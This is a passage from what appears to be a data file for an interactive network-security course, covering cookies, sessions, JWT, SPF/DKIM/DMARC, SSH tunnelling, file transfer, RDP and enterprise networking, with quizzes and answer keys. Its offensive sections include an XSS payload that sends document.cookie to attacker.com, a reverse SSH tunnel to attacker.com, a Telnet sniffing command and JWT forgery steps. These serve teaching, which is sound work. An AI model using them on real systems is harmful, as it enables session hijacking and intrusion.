                        "explanation": "The server issues a `Set-Cookie:` response header instructing the browser's cookie jar to persist the name-value pair for subsequent requests."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 90,
                    "title": "The Cookie Security Flags: HttpOnly, Secure, SameSite",
                    "summary": "The critical defensive trinity that secures session cookies against XSS and CSRF.",
                    "concept": "A modern secure cookie header looks like this:\n`Set-Cookie: session=xyz987; Secure; HttpOnly; SameSite=Strict`\n1. `HttpOnly`: Prevents client-side JavaScript (`document.cookie`) from reading the cookie. Completely neutralizes cookie theft via Cross-Site Scripting (XSS)!\n2. `Secure`: Instructs browser to NEVER transmit the cookie over unencrypted HTTP (HTTPS only), defeating cleartext sniffer theft.\n3. `SameSite`: Governs cross-site request behavior (defeats CSRF attacks):\n   - `Strict`: Never sent on cross-site requests (even clicking a link from an external email).\n   - `Lax`: Sent on top-level GET navigations (safe default in modern browsers).\n   - `None`: Sent on all cross-site requests (requires `Secure` flag).",
                    "cyberLens": {
                        "offensive": "If a sensitive session cookie lacks the `HttpOnly` flag, any stored or reflected XSS vulnerability allows the attacker to execute `new Image().src='http://attacker.com/?c='+document.cookie` and steal the user's active session!",
                        "defensive": "Always enforce `HttpOnly`, `Secure`, and `SameSite=Lax` or `Strict` on all authentication and session tokens."
                    },
                    "keyPoints": [
                        "HttpOnly stops XSS cookie theft.",
                        "Secure stops Wireshark cleartext sniffer theft.",
                        "SameSite stops Cross-Site Request Forgery (CSRF)."
                    ],
                    "quiz": {
                        "question": "What is the primary security protection provided by setting the 'HttpOnly' flag on a session cookie?",
                        "options": [
                            "It speeds up website loading.",
                            "It prevents client-side JavaScript (e.g. document.cookie) from accessing or stealing the cookie during a Cross-Site Scripting (XSS) attack.",
                            "It restricts the cookie to HTTP port 80 only.",
                            "It forces the user to retype their password every 5 minutes."
                        ],
                        "answer": 1,
                        "explanation": "HttpOnly blocks JavaScript from reading the cookie via `document.cookie`. Even if an attacker executes malicious JavaScript on the page via XSS, they cannot steal the HttpOnly session token."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 91,
                    "title": "Session Attacks: Hijacking, Fixation, & CSRF",
                    "summary": "How session identifiers are stolen, pre-set, or forged in user browsers.",
                    "concept": "- Session Hijacking: Attacker acquires valid session token (via XSS, network sniffing, or log leakage) and inserts it into their own browser to impersonate victim.\n- Session Fixation: Attacker tricks victim into authenticating using a known session ID pre-set by the attacker (e.g. via URL parameter `?SID=ATTACKER_ID`). Once victim logs in, the attacker accesses the account using that same ID!\n- Cross-Site Request Forgery (CSRF): Malicious site tricks victim's browser into submitting an unauthorized state-changing request (e.g. `/transfer?amount=1000`) to an authenticated bank site because the browser automatically attaches stored cookies.",
                    "cyberLens": {
                        "offensive": "Session Fixation is devastating on legacy PHP apps that do not regenerate session identifiers upon successful login.",
                        "defensive": "Session Regeneration: The application MUST regenerate a brand-new random session ID immediately upon successful user authentication (`session_regenerate_id(true)` in PHP), invalidating the old anonymous pre-login token."
                    },
                    "keyPoints": [
                        "Always regenerate session IDs upon login and privilege escalation.",
                        "Anti-CSRF tokens (unique, unpredictable tokens per form) defeat CSRF.",
                        "Implement idle and absolute session expiration timeouts."
                    ],
                    "quiz": {
                        "question": "How does a web application effectively eliminate the Session Fixation attack vulnerability?",
                        "options": [
                            "By making passwords longer.",
                            "By immediately generating a brand-new, random session ID and discarding the old one as soon as the user logs in successfully.",
                            "By disabling HTTPS.",
                            "By allowing users to choose their own session ID numbers."
                        ],
                        "answer": 1,
                        "explanation": "Session fixation relies on the pre-login session ID remaining valid after authentication. Regenerating the session ID upon login immediately invalidates the attacker's pre-set token."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 92,
                    "title": "JSON Web Tokens (JWT) vs Stateful Sessions",
                    "summary": "Header.Payload.Signature: Stateless tokens, cryptographic signing, and common JWT flaws.",
                    "concept": "Modern single-page applications (React, Angular) and microservices often use stateless JSON Web Tokens (JWT):\n- Structure: `Header.Payload.Signature` (Base64URL encoded).\n  - Header: Algorithm & token type (`{\"alg\": \"HS256\", \"typ\": \"JWT\"}`).\n  - Payload: Claims (`{\"sub\": \"123\", \"username\": \"alice\", \"role\": \"user\"}`).\n  - Signature: `HMACSHA256(Base64(Header) + \".\" + Base64(Payload), SecretKey)`.\n- Stateless: The server does NOT store sessions in a database; it validates the cryptographic signature on each request.",
                    "cyberLens": {
                        "offensive": "JWT Vulnerabilities:\n1. `alg: none` exploit: Attacker sets algorithm to `none`, removes signature, and modifies payload to `role: admin`.\n2. Algorithm Confusion (RS256 to HS256): Attacker changes algorithm from asymmetric RSA to symmetric HMAC and signs the token using the server's public RSA key as the HMAC secret key!",
                        "defensive": "Never trust the algorithm specified in the incoming token header; hardcode the required verification algorithm in server code."
                    },
                    "keyPoints": [
                        "JWT payload is merely Base64 encoded, NOT encrypted (anyone can read it!).",
                        "Signature guarantees integrity, not confidentiality.",
                        "Revoking a stateless JWT before its expiration requires an explicit token blocklist."
                    ],
                    "quiz": {
                        "question": "Can an eavesdropper read the contents of a standard JSON Web Token (JWT) transmitted over an unencrypted network?",
                        "options": [
                            "No, because JWTs are always encrypted with AES-256.",
                            "Yes, because the JWT payload is only Base64URL-encoded (serialized), not encrypted.",
                            "Only if they have the secret signing key.",
                            "JWTs cannot be sent over networks."
                        ],
                        "answer": 1,
                        "explanation": "A standard JWT is digitally signed, NOT encrypted. The payload is simply Base64-encoded JSON that anyone can decode and read at jwt.io."
                    }
                }
            ]
        },

        # CH 19
        {
            "id": "19",
            "module": "04 / SESSIONS & APPLICATION",
            "title": "L7: email protocols",
            "desc": "Follow mail delivery and separate sender claims from authentication checks.",
            "screensCount": 5,
            "sourceRange": "SOURCE 93-97",
            "simulator": "email-security-sim",
            "badge": "Email Authentication",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 93,
                    "title": "The Email Architecture: MUA, MTA, and Protocols",
                    "summary": "How mail travels from sender to receiver: SMTP, POP3, and IMAP.",
                    "concept": "Email delivery splits into two distinct operational halves:\n1. Push Protocol (Sending mail): Simple Mail Transfer Protocol (SMTP, RFC 5321).\n   - Port 25: Server-to-server relay.\n   - Port 587 (Submission with STARTTLS) / Port 465 (SMTPS): Client-to-server submission.\n2. Pull Protocols (Retrieving mail):\n   - POP3 (Post Office Protocol v3, Port 995 with TLS): Downloads messages to local device and deletes from server (single device workflow).\n   - IMAP (Internet Message Access Protocol, Port 993 with TLS): Syncs folders, flags, and messages across multiple devices (cloud standard).",
                    "cyberLens": {
                        "offensive": "Open Relays: Insecurely configured SMTP servers that accept and forward mail from any sender to any recipient without authentication are hijacked by spam botnets to blast phishing emails.",
                        "defensive": "Close all open relays: SMTP servers must require authentication (SMTP-AUTH) for outbound relaying."
                    },
                    "keyPoints": [
                        "SMTP sends; IMAP/POP3 retrieves.",
                        "Port 25 is heavily blocked by residential ISPs to prevent spam botnets.",
                        "IMAP synchronizes state across multiple phones and computers."
                    ],
                    "quiz": {
                        "question": "Which protocol is used by an email client to push and send outgoing messages to a mail server?",
                        "options": [
                            "IMAP",
                            "POP3",
                            "SMTP (Simple Mail Transfer Protocol)",
                            "HTTP"
                        ],
                        "answer": 2,
                        "explanation": "SMTP is the standard protocol for sending/submitting email from client to server and relaying email between mail servers."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 94,
                    "title": "The Anatomy of SMTP & The Spoofing Flaw",
                    "summary": "Envelope From vs Header From: Why anyone can send email pretending to be the CEO.",
                    "concept": "Designed in 1982, SMTP had ZERO built-in sender verification:\n- In an SMTP conversation, the client provides two separate sender identities:\n  1. Envelope Sender (`MAIL FROM: <attacker@evil.com>`): Used by mail servers for return-path bounce delivery.\n  2. Display Header (`From: \"CEO Name\" <ceo@company.com>`): What the human sees in Outlook or Gmail!\nBecause bare SMTP does not check whether the sender actually owns the domain in the `From:` header, anyone connecting to an open SMTP server can forge emails claiming to be from any person or organization in the world.",
                    "cyberLens": {
                        "offensive": "Business Email Compromise (BEC) & Spear Phishing: Attackers forge executive email addresses to order fraudulent wire transfers or request W-2 tax forms from HR.",
                        "defensive": "Deploy the Email Authentication Triad: SPF, DKIM, and DMARC."
                    },
                    "keyPoints": [
                        "The human sees the Header From; the server routes via Envelope From.",
                        "Legacy SMTP does not authenticate the sender's identity.",
                        "Phishing and BEC attacks thrive on this fundamental protocol limitation."
                    ],
                    "quiz": {
                        "question": "Why could any user historically send an email pretending to be ceo@apple.com using raw SMTP commands?",
                        "options": [
                            "Because Apple did not have an email server.",
                            "Because the original SMTP protocol specification has no mechanism to verify that the sending IP address is authorized to use the domain in the 'From:' header.",
                            "Because emails are sent over Wi-Fi.",
                            "Because SMTP is an encrypted protocol."
                        ],
                        "answer": 1,
                        "explanation": "Original SMTP relies entirely on the client telling the truth. The server simply accepted whatever address was typed into `MAIL FROM` and `From:`."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 95,
                    "title": "Sender Policy Framework (SPF)",
                    "summary": "Authorizing sending IP addresses via DNS TXT records.",
                    "concept": "SPF (RFC 7208) allows a domain owner to publish a list of IP addresses authorized to send email for their domain in a DNS TXT record:\n`v=spf1 ip4:198.51.100.0/24 include:_spf.google.com ~all`\nMechanics:\n1. Receiving mail server inspects the Envelope `MAIL FROM` domain.\n2. Queries DNS TXT record for that domain's SPF record.\n3. Checks if sending server's IP address is in the list.\nQualifiers:\n- `+` Pass (authorized)\n- `-` Fail / HardFail (unauthorized, reject)\n- `~` SoftFail (unauthorized, mark as spam/quarantine)\n- `?` Neutral\nSPF Limitation: SPF validates ONLY the Envelope From (`Return-Path`), NOT the Header From displayed to the user!",
                    "cyberLens": {
                        "offensive": "SPF Bypass via Header Mismatch: Attacker sets Envelope `MAIL FROM: attacker@evil.com` (which passes SPF on `evil.com`), but sets Header `From: boss@target.com`! Naive mail filters passing SPF on the envelope display the spoofed boss address.",
                        "defensive": "DMARC solves this limitation by enforcing alignment between the SPF domain and the visible Header From domain."
                    },
                    "keyPoints": [
                        "SPF lists authorized IP addresses in DNS.",
                        "SPF has a maximum limit of 10 DNS lookups to prevent DoS.",
                        "SPF alone does NOT protect the visible 'From:' header."
                    ],
                    "quiz": {
                        "question": "What is the key limitation of SPF that allows attackers to still spoof visible sender names in email clients?",
                        "options": [
                            "SPF does not work with Gmail.",
                            "SPF only validates the hidden Envelope Return-Path address, not the visible 'From:' header displayed to the human user.",
                            "SPF requires fiber cables.",
                            "SPF records can only be 4 letters long."
                        ],
                        "answer": 1,
                        "explanation": "SPF checks the sender IP against the domain in the RFC 5321 Return-Path (envelope). An attacker can pass SPF using their own domain's envelope while forging the visible RFC 5322 'From:' header."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 96,
                    "title": "DomainKeys Identified Mail (DKIM)",
                    "summary": "Cryptographically signing email headers and bodies with public-key cryptography.",
                    "concept": "DKIM (RFC 6376) proves an email was not tampered with in transit and genuinely originated from the claimed domain:\n1. Sending server computes cryptographic hash of email body and selected headers.\n2. Signs hash using its private key, attaching the signature in a `DKIM-Signature:` header:\n   `DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1; b=a7f9...`\n3. Receiving mail server extracts domain `d=` and selector `s=`.\n4. Queries DNS TXT record at `selector1._domainkey.example.com` to fetch the public key.\n5. Verifies signature against the message. If valid, authenticity and integrity are proven!",
                    "cyberLens": {
                        "offensive": "DKIM Replay Attacks: If a DKIM signature does not sign the `Date` or `To` headers, an attacker who intercepts a legitimate signed email can replay (forward) it to millions of targets without breaking the signature.",
                        "defensive": "Oversign critical headers (Subject, From, To, Date) in DKIM configuration to prevent header modification or replay manipulation."
                    },
                    "keyPoints": [
                        "DKIM provides cryptographic non-repudiation and tamper-proofing.",
                        "Private key stays on the mail server; public key is published in DNS.",
                        "Email surviving mailing lists often breaks SPF, but survives DKIM."
                    ],
                    "quiz": {
                        "question": "Where does a receiving mail server fetch the public key required to verify a DKIM cryptographic signature?",
                        "options": [
                            "From an attachment in the email.",
                            "From a DNS TXT record published under selector._domainkey.domain.com.",
                            "From the user's hard drive.",
                            "From the router's ARP table."
                        ],
                        "answer": 1,
                        "explanation": "The receiving server extracts the selector (s=) and domain (d=) from the DKIM-Signature header and queries DNS for the public key stored at `<selector>._domainkey.<domain>`."
                    }
                },
                {
                    "screenNumber": 5,
                    "globalSource": 97,
                    "title": "DMARC: The Ultimate Policy & Enforcement Layer",
                    "summary": "Domain-based Message Authentication, Reporting, and Conformance: Alignment and Reject policies.",
                    "concept": "DMARC (RFC 7489) ties SPF and DKIM together to protect the visible `From:` header:\n1. Identifier Alignment: Enforces that the domain in the visible `From:` header matches the domain authenticated by SPF and/or DKIM.\n2. Policy Action (`p=` in DNS TXT record at `_dmarc.example.com`):\n   - `p=none`: Monitor only (collect feedback reports, don't block).\n   - `p=quarantine`: Send failed emails to Spam / Junk folder.\n   - `p=reject`: Completely drop/reject unauthorized emails at the gateway!\n3. Reporting: Receiving servers send automated XML aggregate reports (`rua=`) back to the domain owner detailing who is sending email on their behalf.",
                    "cyberLens": {
                        "offensive": "Domains with `p=none` or missing DMARC records can be spoofed directly to execute executive phishing with 100% inbox delivery.",
                        "defensive": "Organizations must move DMARC policy from `p=none` -> `p=quarantine` -> `p=reject` to completely neutralize spoofing of their brand."
                    },
                    "keyPoints": [
                        "DMARC requires either SPF or DKIM to align with the visible From header.",
                        "Only `p=reject` provides definitive protection against email spoofing.",
                        "`_dmarc.domain.com` TXT record defines the global policy."
                    ],
                    "quiz": {
                        "question": "What DMARC policy setting actively commands receiving mail servers to drop and reject all unauthenticated spoofed emails pretending to come from your domain?",
                        "options": [
                            "p=none",
                            "p=quarantine",
                            "p=reject",
                            "p=allow"
                        ],
                        "answer": 2,
                        "explanation": "`p=reject` is the highest level of DMARC enforcement. Mail servers receiving emails that fail DMARC alignment will reject and delete them immediately."
                    }
                }
            ]
        },

        # CH 20
        {
            "id": "20",
            "module": "04 / SESSIONS & APPLICATION",
            "title": "L7: remote access & file transfer",
            "desc": "Compare remote shells, tunnels, file transfer, and management exposure.",
            "screensCount": 5,
            "sourceRange": "SOURCE 98-102",
            "simulator": "remote-access-sniffer",
            "badge": "Remote Management",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 98,
                    "title": "Telnet vs Secure Shell (SSH)",
                    "summary": "Cleartext ASCII terminals vs cryptographically authenticated encrypted channels.",
                    "concept": "- Telnet (Port 23): Developed in 1969. Sends all keystrokes, passwords, and shell output in cleartext over TCP. Anyone sniffing the network (Wireshark) sees root credentials in plaintext.\n- SSH (Secure Shell, Port 22): Provides encrypted remote shell, file transfer, and port forwarding.\n  - Key Exchange: Diffie-Hellman negotiates shared session key.\n  - Host Key Verification: Server presents host key; client checks against `~/.ssh/known_hosts` (defeats MITM).\n  - User Authentication: Passwords, Public Key authentication (Ed25519/RSA), or Hardware Security Keys (FIDO2).",
                    "cyberLens": {
                        "offensive": "Legacy Sniffing: If network switches or IoT devices use Telnet, attackers use `tcpdump -A 'port 23'` to harvest administrative credentials as engineers log in.\nSSH Brute-Force: Attackers run automated password sprayers (Hydra) against port 22.",
                        "defensive": "Disable Telnet universally. On SSH, disable password authentication (`PasswordAuthentication no`) and disable root login (`PermitRootLogin no`), enforcing Ed25519 public keys."
                    },
                    "keyPoints": [
                        "Telnet sends raw passwords in plaintext; never use it.",
                        "SSH uses public keys and known_hosts to prevent MITM attacks.",
                        "Ed25519 is the modern recommended cryptographic algorithm for SSH keys."
                    ],
                    "quiz": {
                        "question": "What is the purpose of the ~/.ssh/known_hosts file on an SSH client machine?",
                        "options": [
                            "It stores user passwords in plaintext.",
                            "It records the cryptographic public host keys of remote servers you have connected to, warning you if the server's key changes (detecting MITM attacks).",
                            "It lists favorite websites.",
                            "It speeds up file downloads."
                        ],
                        "answer": 1,
                        "explanation": "`known_hosts` caches the remote server's public key fingerprint on first connection. If an attacker executes a MITM attack, the key mismatch triggers the famous 'WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!'."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 99,
                    "title": "SSH Port Forwarding & Pivoting",
                    "summary": "Local port forwarding, Remote reverse tunnels, and Dynamic SOCKS proxies.",
                    "concept": "SSH can encapsulate arbitrary TCP traffic inside its encrypted tunnel:\n1. Local Port Forwarding (`ssh -L 8080:internal.db:3306 user@bastion`):\n   - Client opens local port 8080. Traffic sent to `localhost:8080` is encrypted through bastion and forwarded to internal database on 3306.\n2. Remote / Reverse Port Forwarding (`ssh -R 9001:localhost:22 user@attacker.com`):\n   - Server on Internet opens port 9001. Traffic to server:9001 tunnels back to target's internal SSH port 22 (bypasses inbound firewalls and NAT!).\n3. Dynamic Port Forwarding (`ssh -D 1080 user@bastion`):\n   - Turns SSH client into a local SOCKS5 proxy, routing all browser/Nmap traffic through the bastion host.",
                    "cyberLens": {
                        "offensive": "Pivoting & C2 Egress: Attackers who compromise an internal workstation use SSH reverse tunnels or dynamic SOCKS proxies (`proxychains`) to pivot laterally through the entire internal enterprise network.",
                        "defensive": "Restrict SSH tunneling on jump hosts by setting `AllowTcpForwarding no` and `PermitOpen` restrictions in `/etc/ssh/sshd_config`."
                    },
                    "keyPoints": [
                        "-L tunnels local out to remote.",
                        "-R punches reverse tunnels out from behind firewalls.",
                        "-D creates a versatile SOCKS5 proxy for tunneling tools."
                    ],
                    "quiz": {
                        "question": "Which SSH command creates a local SOCKS5 proxy on port 1080, allowing you to route any tool's traffic through the remote server?",
                        "options": [
                            "ssh -L 80:remote:80 user@server",
                            "ssh -D 1080 user@server",
                            "ssh -R 1080:localhost:80 user@server",
                            "ssh -X user@server"
                        ],
                        "answer": 1,
                        "explanation": "The `-D` flag (Dynamic port forwarding) allocates a SOCKS listener on the local port (e.g. 1080), dynamically forwarding any application traffic configured to use the proxy."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 100,
                    "title": "File Transfer Protocols: FTP vs FTPS vs SFTP",
                    "summary": "Understanding the massive confusion between three completely different protocols.",
                    "concept": "1. FTP (File Transfer Protocol, RFC 959):\n   - Insecure cleartext. Uses TWO separate connections: Control (Port 21) and Data (Port 20 in Active mode, or random dynamic port in Passive mode). Breaks easily across firewalls.\n2. FTPS (FTP Secure / FTP-SSL):\n   - The legacy FTP protocol wrapped inside a TLS encryption tunnel. Still uses two separate connections.\n3. SFTP (SSH File Transfer Protocol):\n   - COMPLETELY UNRELATED TO FTP! It is an extension of the SSH protocol running entirely over a single encrypted SSH connection (Port 22).",
                    "cyberLens": {
                        "offensive": "FTP Credential Sniffing: Attackers capture cleartext `USER` and `PASS` commands over FTP. In Active FTP, the server connects back to the client, which attackers exploit in FTP Bounce Attacks to scan internal ports.",
                        "defensive": "Decommission legacy FTP servers; migrate all automated file transfer workflows to SFTP with SSH key authentication."
                    },
                    "keyPoints": [
                        "FTP uses 2 connections (Control and Data); SFTP uses 1 connection (SSH).",
                        "SFTP and FTPS are completely different protocols.",
                        "Standard FTP sends credentials and files completely unencrypted."
                    ],
                    "quiz": {
                        "question": "What is the fundamental architectural difference between SFTP and FTPS?",
                        "options": [
                            "SFTP runs over SSH (Port 22) on a single channel, whereas FTPS is legacy FTP wrapped in TLS using dual control/data connections.",
                            "SFTP does not use encryption.",
                            "FTPS is only used on Mac computers.",
                            "They are identical protocols with different names."
                        ],
                        "answer": 0,
                        "explanation": "SFTP is an SSH subsystem running on port 22. FTPS is the old multi-port FTP protocol running over TLS (ports 21/990)."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 101,
                    "title": "Remote Desktop Protocol (RDP) & VNC",
                    "summary": "Port 3389, Network Level Authentication (NLA), and critical CVE vulnerabilities.",
                    "concept": "- RDP (Remote Desktop Protocol, Port 3389): Proprietary Microsoft protocol for graphical remote Windows desktop sessions.\n  - Uses TLS encryption.\n  - Network Level Authentication (NLA): Requires the user to authenticate credentials against CredSSP BEFORE the full RDP graphical session and TLS handshake is initiated.\n- VNC (Virtual Network Computing, Port 5900): RFB protocol; historically unencrypted and restricted to 8-character passwords.",
                    "cyberLens": {
                        "offensive": "RDP Exposure Exploits: Exposed RDP on the public Internet is the #1 vector for ransomware initial access (via brute force). Critical vulnerabilities like BlueKeep (CVE-2019-0708) allow pre-authentication Remote Code Execution (RCE) on systems without NLA!",
                        "defensive": "NEVER expose port 3389 directly to the public Internet. Enforce NLA, require MFA via VPN / Cloudflare Access, and limit login attempts."
                    },
                    "keyPoints": [
                        "RDP runs on port 3389; VNC runs on port 5900.",
                        "Network Level Authentication (NLA) prevents pre-auth exploits like BlueKeep.",
                        "Ransomware gangs scan continuously for exposed RDP endpoints."
                    ],
                    "quiz": {
                        "question": "Why is enabling Network Level Authentication (NLA) essential for securing Windows RDP servers?",
                        "options": [
                            "It increases screen resolution.",
                            "It forces the client to prove valid Windows credentials before the RDP server spawns a full session or processes complex graphic subroutines, neutralizing pre-auth exploits like BlueKeep.",
                            "It turns off passwords.",
                            "It converts RDP into SSH."
                        ],
                        "answer": 1,
                        "explanation": "Without NLA, anyone connecting to port 3389 can reach vulnerable Windows kernel graphics drivers before logging in. NLA requires successful credential authentication first, stopping unauthenticated exploits."
                    }
                },
                {
                    "screenNumber": 5,
                    "globalSource": 102,
                    "title": "Management Surface Exposure & Bastion Architecture",
                    "summary": "Zero-exposure principles, Jump Boxes, and Identity-Aware Proxies.",
                    "concept": "Exposing internal management interfaces (SSH, RDP, Web Admin consoles, IPMI) directly to public IP addresses is the leading cause of enterprise breaches.\nModern Architecture:\n1. Bastion Host / Jump Box: A hardened, minimal Linux/Windows server placed in an isolated management DMZ. All administrators must SSH/RDP into the jump box using MFA before accessing internal servers.\n2. Identity-Aware Proxy (IAP) / Zero Trust Network Access (ZTNA): Cloudflare Tunnel, AWS Systems Manager (SSM), or Google IAP.\n   - No inbound firewall ports are opened anywhere!\n   - An outbound agent connects to the cloud proxy, authenticating users via SAML/OIDC and SSO with MFA before proxying SSH/RDP.",
                    "cyberLens": {
                        "offensive": "Shodan & Censys Scanning: Attackers search Shodan for exposed IPMI/iLO server management cards or unauthenticated Kubernetes API dashboards (port 6443) to seize bare-metal hardware control.",
                        "defensive": "Isolate all management traffic to a dedicated out-of-band (OOB) management network inaccessible from both the Internet and standard user workstations."
                    },
                    "keyPoints": [
                        "Zero open inbound management ports is the gold standard.",
                        "Bastion hosts enforce multi-factor authentication and session audit recording.",
                        "ZTNA proxies eliminate the need for traditional corporate VPNs."
                    ],
                    "quiz": {
                        "question": "What is the primary security advantage of an Identity-Aware Proxy (e.g. AWS SSM or Cloudflare Tunnel) over a traditional open SSH port?",
                        "options": [
                            "It requires zero inbound open firewall ports on the target machine, eliminating public IP port scanning and brute-force attacks.",
                            "It makes internet connections 10 times faster.",
                            "It eliminates the need for passwords.",
                            "It converts Linux into Windows."
                        ],
                        "answer": 0,
                        "explanation": "With an outbound tunnel/agent, the server opens NO listening ports to the public Internet, rendering it completely invisible to Shodan and automated vulnerability scanners."
                    }
                }
            ]
        },

        # CH 21
        {
            "id": "21",
            "module": "05 / ENTERPRISE & DEFENCE",
            "title": "Infrastructure & what comes next",
            "desc": "Meet enterprise protocols and the policy questions that survive changing tools.",
            "screensCount": 4,
            "sourceRange": "SOURCE 103-106",
            "simulator": "enterprise-arch-sim",
            "badge": "Enterprise Core",
            "screens": [
                {
                    "screenNumber": 1,
                    "globalSource": 103,
                    "title": "The Cisco 3-Tier Hierarchical Model",
                    "summary": "Core, Distribution, and Access layers: predictable scaling and fault isolation.",
                    "concept": "Enterprise campus networks traditionally follow a structured 3-tier hierarchy:\n1. Core Layer: High-speed packet switching backbone (no packet filtering or QoS overhead; pure raw forwarding speed).\n2. Distribution / Aggregation Layer: Enforces routing policies, VLAN routing, Access Control Lists (ACLs), security filtering, and QoS boundaries.\n3. Access Layer: User switch ports where workstations, APs, and printers connect. Enforces port security, 802.1X, and PoE.",
                    "cyberLens": {
                        "offensive": "Lateral Movement Choke Points: Attackers navigating between departmental VLANs must traverse the Distribution layer, where inter-VLAN ACLs and NetFlow telemetry can catch them.",
                        "defensive": "Enforce microsegmentation policies at the Distribution layer so finance, HR, and engineering subnets cannot communicate without explicit firewall authorization."
                    },
                    "keyPoints": [
                        "Access layer connects users; Distribution layer enforces security; Core layer routes fast.",
                        "Modularity prevents local switch failures from cascading across the enterprise.",
                        "Modern data centers adapt this into 2-tier Spine-Leaf architecture."
                    ],
                    "quiz": {
                        "question": "At which layer of the Cisco 3-tier hierarchical network model are Access Control Lists (ACLs) and inter-VLAN routing security policies typically enforced?",
                        "options": [
                            "Core Layer",
                            "Distribution Layer",
                            "Access Layer",
                            "Physical Cable Layer"
                        ],
                        "answer": 1,
                        "explanation": "The Distribution layer aggregates access switches and terminates VLAN boundaries, making it the ideal location to enforce routing policies, security filtering, and ACLs."
                    }
                },
                {
                    "screenNumber": 2,
                    "globalSource": 104,
                    "title": "Virtual Private Networks (VPNs): IPsec vs SSL/TLS",
                    "summary": "Site-to-Site vs Remote Access, Tunnel mode vs Transport mode, and ESP/AH.",
                    "concept": "VPNs create encrypted tunnels across untrusted public networks:\n1. IPsec (Layer 3 VPN):\n   - Protocols: Authentication Header (AH, integrity only) and Encapsulating Security Payload (ESP, encryption + integrity).\n   - Modes: Transport Mode (encrypts only payload; IP headers visible) vs Tunnel Mode (encrypts entire original IP packet and wraps inside a new outer IP header; standard for Site-to-Site).\n   - IKEv2 (Internet Key Exchange) negotiates Security Associations (SA).\n2. SSL/TLS VPNs (OpenVPN, WireGuard, AnyConnect):\n   - Operates on Layer 4/7 (TCP/UDP 443).\n   - Ideal for remote user access because port 443 traverses all hotel/airport firewalls easily.",
                    "cyberLens": {
                        "offensive": "VPN Portal Exploitation: Unpatched enterprise SSL-VPN appliances (Pulse Secure, Fortinet, Palo Alto CVEs) are the most frequent initial access vector for nation-state advanced persistent threats (APTs).",
                        "defensive": "Mandate Multi-Factor Authentication (MFA) on all VPN accounts; never expose legacy PPTP or unpatched VPN firmware."
                    },
                    "keyPoints": [
                        "Site-to-site connects office networks; remote access connects remote employees.",
                        "IPsec Tunnel Mode hides internal IP addresses inside a new outer IP header.",
                        "WireGuard is the modern, fast, auditable alternative to legacy IPsec and OpenVPN."
                    ],
                    "quiz": {
                        "question": "What is the primary difference between IPsec Tunnel Mode and IPsec Transport Mode?",
                        "options": [
                            "Tunnel Mode encrypts the entire original IP packet and adds a brand-new outer IP header; Transport Mode only encrypts the payload, keeping original IP headers intact.",
                            "Transport Mode is only used on trains.",
                            "Tunnel Mode does not use encryption.",
                            "They are identical."
                        ],
                        "answer": 0,
                        "explanation": "In Tunnel Mode (used in Site-to-Site VPNs), the entire original internal IP packet is encrypted and placed inside a new routable outer IP packet, hiding internal source and destination IPs."
                    }
                },
                {
                    "screenNumber": 3,
                    "globalSource": 105,
                    "title": "Network Management: SNMP, Syslog, & NTP",
                    "summary": "The control plane protocols that monitor, log, and synchronize enterprise devices.",
                    "concept": "- SNMP (Simple Network Management Protocol, UDP 161/162):\n  - Queries network device health and bandwidth via Management Information Bases (MIBs).\n  - SNMPv1/v2c: Insecure! Transmits plaintext 'Community Strings' (e.g. `public` or `private`).\n  - SNMPv3: Adds DES/AES encryption and user authentication (USM).\n- Syslog (UDP 514): Standard event logging from network hardware to centralized SIEM servers.\n- NTP (Network Time Protocol, UDP 123): Synchronizes millisecond clocks across all servers and firewalls (vital for legal incident response forensic timeline correlation).",
                    "cyberLens": {
                        "offensive": "SNMP Community String Harvesting: Attackers probe for `public` (read-only) or `private` (read-write). Read access dumps network interfaces, routing tables, and device usernames. Read-write access allows rewriting router configs!",
                        "defensive": "Disable SNMPv1/v2c completely; enforce SNMPv3 with SHA authentication and AES encryption."
                    },
                    "keyPoints": [
                        "SNMPv1/v2c community strings are passwords in plaintext.",
                        "Without accurate NTP time synchronization, digital forensics timelines fall apart in court.",
                        "Syslog must be transmitted over TLS (RFC 5425) to prevent tampering."
                    ],
                    "quiz": {
                        "question": "Why is the use of SNMP version 1 and version 2c strictly prohibited in high-security environments?",
                        "options": [
                            "Because they only work on dial-up modems.",
                            "Because they transmit authentication passwords (community strings) in unencrypted cleartext across the network.",
                            "Because SNMP cannot monitor CPU temperature.",
                            "Because SNMP requires Linux."
                        ],
                        "answer": 1,
                        "explanation": "SNMPv1 and v2c send community strings in plaintext. Anyone sniffing the network can capture the string and access full internal hardware configurations."
                    }
                },
                {
                    "screenNumber": 4,
                    "globalSource": 106,
                    "title": "Software-Defined Networking (SDN) & Cloud Overlays",
                    "summary": "Decoupling the control plane from the data plane: OpenFlow, VXLAN, and Cloud VPCs.",
                    "concept": "Traditional routers combine the Control Plane (calculating routes) and Data Plane (forwarding packets) inside every individual physical box.\nSoftware-Defined Networking (SDN) separates them:\n- Control Plane is centralized in a software controller (e.g. OpenFlow, Cisco ACI, VMware NSX).\n- Data Plane consists of dumb, high-speed forwarding switches executing flow rules pushed down by the controller.\n- VXLAN (Virtual Extensible LAN, UDP 4789): Overlays Layer 2 Ethernet frames inside Layer 3 UDP packets, expanding VLAN limits from 4,096 to 16 million virtual networks across cloud datacenters (AWS VPCs).",
                    "cyberLens": {
                        "offensive": "SDN Controller Compromise: If an attacker compromises the central SDN controller API, they gain programmatic control over the entire enterprise forwarding fabric, capable of silently mirroring all enterprise traffic.",
                        "defensive": "Harden SDN controller REST APIs with strict mutual TLS (mTLS), RBAC, and dedicated out-of-band management subnets."
                    },
                    "keyPoints": [
                        "SDN centralizes routing logic in software controllers.",
                        "VXLAN powers modern cloud multitenancy (AWS VPC / Azure VNet).",
                        "Programmable networks allow automated security quarantine of compromised hosts in seconds."
                    ],
                    "quiz": {
                        "question": "What core separation defines Software-Defined Networking (SDN)?",
                        "options": [
                            "Separating keyboards from monitors.",
